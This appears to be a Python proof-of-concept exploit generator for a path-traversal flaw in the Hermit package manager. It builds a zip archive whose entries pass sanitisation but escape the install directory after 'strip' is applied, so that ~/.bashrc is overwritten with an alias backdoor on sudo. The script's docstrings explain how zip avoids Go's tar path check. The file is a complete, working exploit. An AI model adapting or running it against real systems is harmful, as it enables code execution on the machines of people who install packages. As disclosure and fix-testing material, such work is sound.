#!/usr/bin/env python3
"""
generate_tarball.py  -  Hermit strip-after-sanitize PoC exploit generator

Creates a malicious .zip archive that, when installed by Hermit with the
attacker-controlled `strip` manifest field, overwrites ~/.bashrc to
inject an alias backdoor (demonstrating arbitrary code execution).

WHY ZIP (not tar.gz)?
    Go 1.22+ introduced ErrInsecurePath in archive/tar, which rejects
    tar entries containing ".." components.  Go's archive/zip does NOT
    perform this check when iterating zip.Reader.File — the raw entry
    name is preserved, making the exploit viable.

Vulnerability: archive/archive.go  makeDestPath() sanitizes the archive
entry name BEFORE applying `strip`, but strip operates on raw
string-split components preserving ".." literals.  After strip removes
the leading dummy directories, the remaining ".." components escape
the extraction destination.

Usage:
    python3 generate_tarball.py [--strip N] [--out FILE]
"""
import argparse
import io
import os
import sys
import zipfile

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")


def build_zip(strip: int, output: str) -> None:
    """
    Build a ZIP archive whose entry names pass Hermit's sanitizeExtractPath()
    but escape the package directory after strip is applied.

    Entry name formula:
        d1/d2/.../dS / ../../..  (S times) / .bashrc
                 ^^^               ^^^
              F forwards         B backwards

    - sanitizeExtractPath: filepath.Join(dest, entry) resolves F==B
      forward/back pairs, result stays inside dest  ->  PASSES
    - strings.Split + strip=S: removes first S parts (the d1..dS),
      leaving "../../../../.bashrc"  ->  ESCAPES dest by S levels
    """
    # --- 1. Build the exploit entry name ---
    dummies = "/".join(f"d{i}" for i in range(1, strip + 1))
    dotdots = "/".join([".."] * strip)
    evil_entry = f"{dummies}/{dotdots}/.bashrc"

    # --- 2. Legitimate binary (so Hermit accepts the package) ---
    legit_bin = b"#!/bin/sh\necho 'hermit-strip-poc tool'\n"
    legit_name = f"{dummies}/bin/tool"

    # --- 3. Payload: .bashrc alias backdoor ---
    payload = (
        b"\n# --- HERMIT-POC: strip-after-sanitize RCE ---\n"
        b"alias sudo='echo \"[!] RCE via hermit strip-after-sanitize\" && /usr/bin/sudo'\n"
        b"# --- end poc ---\n"
    )

    # --- 4. Write the ZIP archive ---
    os.makedirs(os.path.dirname(output) or ".", exist_ok=True)
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
        # Legitimate binary entry
        info = zipfile.ZipInfo(legit_name)
        info.external_attr = 0o755 << 16  # Unix executable permissions
        zf.writestr(info, legit_bin)

        # Exploit entry (path traversal after strip)
        info = zipfile.ZipInfo(evil_entry)
        info.external_attr = 0o644 << 16  # Unix file permissions
        zf.writestr(info, payload)

    size = os.path.getsize(output)

    # --- 5. Print verification ---
    print("=" * 65)
    print("  HERMIT STRIP-AFTER-SANITIZE  ->  RCE EXPLOIT GENERATOR")
    print("=" * 65)
    print()
    print(f"  Output:       {output} ({size} bytes)")
    print(f"  Format:       ZIP  (bypasses Go 1.22+ tar ErrInsecurePath)")
    print(f"  Strip:        {strip}")
    print(f"  Legit entry:  {legit_name}")
    print(f"  Evil entry:   {evil_entry}")
    print()
    print("--- SANITIZE CHECK (what Hermit sees) ---")
    print(f"  filepath.Join(dest, \"{evil_entry}\")")
    print(f"  -> filepath.Clean resolves {strip} forward + {strip} back = stays in dest")
    print(f"  -> strings.HasPrefix(result, dest) = True  [PASSES]")
    print()
    print(f"--- AFTER strip={strip} ---")
    parts = evil_entry.split("/")
    remaining = "/".join(parts[strip:])
    print(f"  parts[{strip}:] = {parts[strip:]}")
    print(f"  remaining  = \"{remaining}\"")
    print(f"  filepath.Join(dest, \"{remaining}\")  ->  ESCAPES dest by {strip} levels")
    print()
    print("--- PAYLOAD (.bashrc content) ---")
    print(payload.decode(), end="")
    print()
    print("[+] ZIP archive written successfully.")


def main():
    parser = argparse.ArgumentParser(
        description="Generate exploit ZIP for Hermit strip-after-sanitize"
    )
    parser.add_argument(
        "--strip", type=int, default=4,
        help="Strip value (default: 4 for default ~/.cache/hermit state dir)"
    )
    parser.add_argument(
        "--out", default="packages/malicious-rce.zip",
        help="Output path (default: packages/malicious-rce.zip)"
    )
    args = parser.parse_args()
    build_zip(args.strip, args.out)


if __name__ == "__main__":
    main()
